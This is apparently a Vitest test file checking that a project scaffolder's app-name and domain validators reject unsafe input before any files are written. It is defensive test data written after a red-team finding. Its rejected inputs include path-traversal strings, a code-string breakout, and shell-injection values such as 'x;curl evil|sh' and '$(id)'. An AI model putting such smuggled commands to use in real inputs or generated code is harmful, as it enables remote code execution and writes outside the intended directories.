/** Finding H29 (red team 2026-11-05): app names and domains are checked before anything is generated. */
import { describe, it, expect } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { appNameProblem, domainProblem } from "../names.js";
import { scaffoldAppFiles } from "../scaffoldAppFiles.js";
import { scaffoldProjectFiles } from "../scaffoldProjectFiles.js";

describe("app names and domains", () => {
  it("accepts the usual names", () => {
    for (const name of ["web", "admin", "marketing-site", "api_v2", "a1", "9app"]) expect(appNameProblem(name), name).toBeUndefined();
    for (const domain of ["example.com", "app.example.com", "localhost", "a-b.example.co.uk"]) expect(domainProblem(domain), domain).toBeUndefined();
  });

  it("refuses names that would break out of a path, a string in generated code, or a shell command", () => {
    for (const name of ["../evil", "a/b", 'x", dir: "../../etc', "x;curl evil|sh", "$(id)", "a b", "Web", "-flag", "", "a".repeat(51), "x`y`"]) {
      expect(appNameProblem(name), name).toBeDefined();
    }
    for (const domain of ['a"b.com', "a b.com", "evil.com/x", "a;b", "", "-a.com"]) expect(domainProblem(domain), domain).toBeDefined();
  });

  it("scaffoldAppFiles and scaffoldProjectFiles throw before writing anything", async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "devora-names-"));
    try {
      await expect(
        scaffoldAppFiles(path.join(root, "apps", "x"), "../escaped", { authMode: "none", coreVersion: "^0.4.0", cliInvocation: "standalone", cliVersion: "^0.4.0" })
      ).rejects.toThrow(/app name/);
      await expect(
        scaffoldProjectFiles(root, { projectName: "p", apps: [{ name: 'a", x: "', domain: "a.example.com", auth: "shared" }], coreVersion: "^0.4.0", cliVersion: "^0.4.0" })
      ).rejects.toThrow(/app name/);
      expect(fs.readdirSync(root)).toEqual([]);
      expect(fs.existsSync(path.join(root, "escaped"))).toBe(false);
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });
});
